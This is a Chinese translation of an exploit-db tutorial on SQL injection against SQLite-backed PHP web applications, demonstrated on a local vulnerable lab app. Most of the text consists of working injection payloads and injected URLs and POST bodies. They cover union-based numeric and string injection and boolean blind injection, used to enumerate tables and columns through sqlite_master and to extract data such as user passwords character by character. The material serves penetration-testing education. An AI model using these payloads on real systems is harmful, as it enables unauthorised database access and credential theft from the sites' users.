
# 【技术分享】基于SQLite数据库的Web应用程序注入指南


                                阅读量   
                                **183764**
                            
                        |
                        
                                                                                                                                    ![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：exploit-db.com
                                <br>原文地址：[https://www.exploit-db.com/docs/41397.pdf](https://www.exploit-db.com/docs/41397.pdf)

译文仅供参考，具体内容表达以及含义原文为准

****

[![](./img/85552/t015446e15d788fd96e.jpg)](./img/85552/t015446e15d788fd96e.jpg)

翻译：[scriptkid](http://bobao.360.cn/member/contribute?uid=2529059652)

预估稿费：200RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

**<br>**

**概述**

SQL注入又称hacking之母，是造成网络世界巨大损失而臭名昭著的漏洞之一，研究人员已经发布了许多关于不同SQL服务的不同攻击技巧相关文章。对于MSSQL,MySQL和ORACLE数据库来说，SQL注入的payload一抓一大把，你可以在web应用中利用SQL注入漏洞进行攻击，如果其中任何一种数据库被用来作为后端数据库。SQLite就比较不那么出名了，因此相关的SQL注入payload就比较少，如果你想攻击后端数据库为SQLite的，那你就得去学习SQLite相关功能，然后构造出你自己的payload。因此，本文中我们将探讨两种关于SQLite的SQL注入攻击技巧。

1、基于联合查询的SQL注入（数字型或字符型）

2、SQL盲注

<br>

**实验环境**

为了实现基于SQLite的SQL注入，我们需要以下环境：

1、web服务器（这里是apache）

2、PHP环境

3、使用SQLite数据库的存在漏洞的web应用，这里有一个我自己开发的[应用](https://github.com/incredibleindishell/sqlite-lab)

测试应用包里包含PHP代码和SQLite数据库(ica-lab.db).数据库共有两个表单：Info和Users

<br>

**实施攻击**

**1、基于联合查询的SQL注入**

基于联合查询的SQL注入并不难，SQL查询直接去数据库中获取表名以及列名。让我们来试试基于联合查询的SQL注入(数字型)，注入点：

[http://127.0.0.1/sqlite-lab/index.php?snumber=1](http://127.0.0.1/sqlite-lab/index.php?snumber=1)

在尝试order by子句后，我们可以发现列数为5，Inject URL：

```
http://127.0.0.1/sqlite-lab/index.php?snumber=1 union select 1,2,3,4,5--
```

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b4d45fada235c714.png)

列2，3，4的数据在web页面上被打印出来了，因此我们需要利用这三个列的其中一个或多个。

**获取表名**

在SQLite中，为了猜解表名我们需要运行以下查询：

```
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

在漏洞应用程序里，如果我们构造像以下这样的链接，web应用将会在2这个位置显示所有表名：

```
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union SELECT 1,group_concat(tbl_name),3,4,5 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c8ee5aa8c9621f3b.png)

为了让表名单独显示，我们可以使用带offset的limit子句，就像这样：

```
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union SELECT 1,tbl_name,3,4,5 FROM sqlite_master where type='table' and tbl_name NOT like 'sqlite_%'' limit 2 offset 1
```

limit后面接的数字是为了获取行数，而offest后面接的数字则为第一次返回结果中的删除数。在上述查询中，limit提取了两个表名，然后哦第一个被offset删除掉，所以我们获得了第二个表名。类似的，为了获取第三个表名，只需要改变limit和offset为3跟2即可，即limit 3 offset 2.

**获取列名**

对于获取列名来说，同样有个简单的SQL查询来从指定表中获取列名。

```
union SELECT 1,sql,3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name='table_name'
```

只要把上述查询中的table_name替换为你想要获取列名的相应表的表名即可，在本例中，我想获取info表的列名：

```
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union SELECT 1,sql,3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='info'
```

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013d9b3de5a1366bc2.png)

**获取“干净”列名的payload**

用以下payload来替代'sql',其余的payload保持不变

```
replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~')
```

Inject URL:

```
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union select 1,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' and name='info'
```

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012d2ca62e53c52e4c.png)

**获取列中的数据**

现在我们有了表名和列名，最后一件事就是去获取我们想要的列中对应的数据了，可以使用如下SQL查询：

```
Select column_name from table_name
```

只要将column_name和table_name替换为你想要的名字就行了，在本例中表名为info，列名为OS，因此最终查询语句为:

```
select OS from info
```

Inject URL

```
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union SELECT 1,OS,3,4,5 FROM info
```

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bfa95701b6d6693e.png)

我们可以使用group_concat函数来提取列中的完整数据。

```
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union SELECT 1,group_concat(OS,'~~'),3,4,5 FROM info
```

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0104791314e5aab162.png)

**2、基于联合查询的SQL注入(字符型)**

字符型的基于联合查询的SQL注入与数字型的并没有太大差别，唯一的区别在于，用户的数据将被放入SQL分割符之间，我们将需要逃逸引号、括号等分隔符的闭合。在漏洞应用程序中有一处字符型的基于联合查询的SQL注入，注入点如下：

```
http://127.0.0.1/sqlite-lab/index.php?tag=ubuntu
```

为了利用该SQL注入，只需要在payload前加上'并在结束前加上– -，举个例子，要获取表名需要用到如下payload:

```
' union select 1,2,3,4,5 FROM sqlite_master WHERE type IN('table','view') AND name NOT LIKE 'sqlite_%' -- -
```

Inject URL

```
http://127.0.0.1/sqlite-lab/index.php?tag=ubuntu' union select 1,2,3,4,5 FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%' -- -
```

因此，字符型基于联合查询的SQL注入除了一点点调整以逃逸分隔符外，与数字型的并没有差别。

**3、布尔型SQL盲注**

在本节中我们将讨论SQL盲注技巧。基于联合查询的注入简单而直接，但盲注就比较需要时间和技巧了。在开始之前，先鉴别下注入点是字符型还是数字型的，如果注入点是数字型，那我们需要做的调整和payload将如以下所示。

```
paramater=value and 2 &lt; 3--
```

如果注入点是字符型的，那payload就长以下这样:

```
paramater=value' and 2 &lt; 3-- -
paramater=value) and 2 &lt; 3-- -
paramater=value') and 2 &lt; 3-- -
```

如果SQL注入是字符型的，只要将你的payload放置到闭合分割符和– -之间，假设我们用来探测的语句是:

```
paramater=value) and 2 &lt; 3-- -
```

那么，payload将被放置在value)和– -之间:

```
paramater=value) put_your_payload_here-- -
```

现在，我们开始对数据库进行枚举，在本例中的index.php脚本中，POST参数'tag‘存在布尔型的SQL盲注，一个可用请求如下：

```
http://127.0.0.1/sqlite-lab/index.php
POST body data
tag=ubuntu&amp;search=Check+Plan
```

让我们开始吧!

**计算表单数量**

为了计算表单的数量，我们可以使用如下payload：

```
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) &lt; number_of_table
```

用数字来替换number_of_table，现在就让我们在实验环境中测试吧，我们将判断数据库表单总数是否小于5，payload长这样：

```
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) &lt;5
```

然后注入的HTTP请求长以下这样：

```
http://127.0.0.1/sqlite-lab/index.php
POST request data
tag=ubuntu' and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) &lt; 5 -- - search=Check+Plan
```

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0159af15755fc17535.png)

在fuzz中，我们需要检查页面内容与之前是否一致，一致则为真即表单数量小于5。接着，当我们将数量改为2，数据库表单数量为2，因此状态为假，即页面将与之前不一致。为了确认表单数量，使用=来代替&lt;和&gt;。

```
http://127.0.0.1/sqlite-lab/index.php
POST body data
tag=ubuntu' and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) =2 -- -&amp;search=Check+Plan
```

确认了表单数量后，我们就一个接一个地猜解表名。

**猜解表名**

为了猜解表名长度，可以使用以下payload：

```
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
```

此处，将table_name_length_number替换为数字，如以下我们确认第一个表名长度是否小于6，payload：

```
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &lt; 6
```

通过fuzz，我们可以得到表名的长度，然后接着猜解下一个表名的长度，只需要增加limit和offset的值即可：

```
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1) = table_name_length_number
```

其余的payload则保持一致。接着，我们将通过如下payload猜解表名，在该payload中，我们将使用hex值来与表名中的字符进行对照。

```
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &gt; hex('some_char')
```

该payload提取表名然后提取其中字符，将其转换为hex表示，再跟我们猜测的值进行对比。hex(substr(name,1,1))函数从指定位置提取表名中的一个字符。在上述代码中，substr函数从位置1提取一个字符，再将其转换为hex形式。如果是hex(substr(name,3,1))则表示从第3位开始，截取一个字符。在payload最后，hex('some_char')是我们需要猜测的指定表名字符，hex函数将会将其转换为hex值，这将会让我们的注入更加快速一些。

一旦我们得到表名的第一个字符后，我们将继续猜解第二个字符，为了猜解下一个字符，我们需要改变sbustr函数中代表字符所在位置的数字。即hex(substr(name,1,1))中将1,1改为2，1，接着，我们再进行相同的步骤直到猜解完毕。

让我们来看看具体情况，首先我们将猜解表名第一个字母是否大于'a'：

```
http://127.0.0.1/sqlite-lab/index.php
POST body data
tag=ubuntu' and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &gt; hex('a')-- -&amp;search=Check+Plan
```

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d1992180c85bd67e.png)

页面响应与未被注入时一致，这意味着表名的第一个字符大于'a'，在第二次测试中，我们尝试字符k，即测试表名第一个字符是否大于字母'k'，因此，请求长这样：

```
http://127.0.0.1/sqlite-lab/index.php
POST body data
tag=ubuntu' and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &gt; hex('k')-- -&amp;search=Check+Plan
```

现在，页面响应与之前普通页面不一致了，即说明表名第一个字符不大于字母k。因此，通过上面两个请求，我们得出表名第一个字符在'a'和'k'之间。在多次尝试后，我们就可以将范围缩到两个前后为同一个字符，这时我们使用=来判断：

```
http://127.0.0.1/sqlite-lab/index.php
POST body data
tag=ubuntu' and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('i')-- -&amp;search=Check+Plan
```

以上就是通过fuzz猜解表名的过程，为了继续猜解下一个字符，只需要将hex(substr(name,1,1))中的1，1改为2，1即可，其余不变，然后就继续猜解直到完全猜解出来为止吧。

**猜解列名**

为了猜解列名，我们将会使用如下payload来获取列名列表：

```
replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),"`","")
```

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t019d065802682efc89.png)

以上，在“中的即为列名，上面提到的payload将会提取出所有列名，为了提取相应字符数据需要将其转换为hex再进行比较，以下payload将会有所帮助：

```
hex(substr(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),"`",""),column-name_character_numer,1))
```

你只需要将上面payload中的column-name_character_numer替换为相应的数字即可，比如想要猜解列名列表中的第一个字符，你只需将其替换为1.本例中的SQL盲注payload如下：

```
and (select hex(substr(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),"`",""),1,1)) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' and name='info') &lt; hex('Character_we_are_guessing')
```

将Character_we_are_guessing替换为想要猜解的字符即可，就像下面示例，hex('q')表示我们想要确认第一个字符是否在'q'之前。

```
http://127.0.0.1/sqlite-lab/index.php
POST body data
tag=ubuntu' and (select hex(substr(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),"`",""),1,1)) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' and name='info') &lt; hex('q')-- -&amp;search=Check+Plan
```

页面内容与之前的一致，即列名第一个字符在q之前。后续步骤与前面猜解表名类似。

**从列中猜解数据**

接着让我们来猜解列中的数据。在猜解完表名和列名后，假设我们想要猜解users表中password列的数据。如我们所知，从表中的列里面提取数据的SQL查询如下：

```
Select column_name from table_name
```

上述查询将返回所有结果，为了限制只返回一条结果，可以使用：

```
Select password from users limit 1 offset 0
```

计算查询结果数量可以使用：

```
Select count(password) from users
```

获取单一结果的长度可以使用：

```
Select length(password) from users limit 1 offset 0
```

现在，让我们开始提取数据吧，SQL查询如下：

```
Select hex(substr(password,1,1)) from users limit 1 offset 0
```

在SQL盲注中payload则为：

```
and (Select hex(substr(password,1,1)) from users limit 1 offset 0)&gt;hex(‘some_char’)
```

让我们开始提取数据的第一个字符吧，payload：

```
and (Select hex(substr(password,1,1)) from users limit 1 offset 0) &gt; hex('k')
```

注入请求：

```
http://127.0.0.1/sqlite-lab/index.php
Post body data
tag=ubuntu' and (Select hex(substr(password,1,1)) from users limit 1 offset 0) &gt;hex('a')-- -&amp;search=Check+Plan
```

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016a9fa4fbdf770484.png)

页面内容与之前一致，我们可以确定第一个字符在'a'之后，将字符换位'k‘，然后我们就可以看到页面不一致。

[![](./img/85552/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ee754a7f318e06c7.png)

于是得到第一个字符位于'a'到'k'之间。后续猜解过程与前面猜解表名和列名一致，重复猜解动作直到猜解出所有字符为止。

<br>

**致谢**

特别感谢IndiShell Crew 和 Myhackerhouse给我的灵感。

<br>

**参考链接**

[https://www.sqlite.org/](https://www.sqlite.org/) 
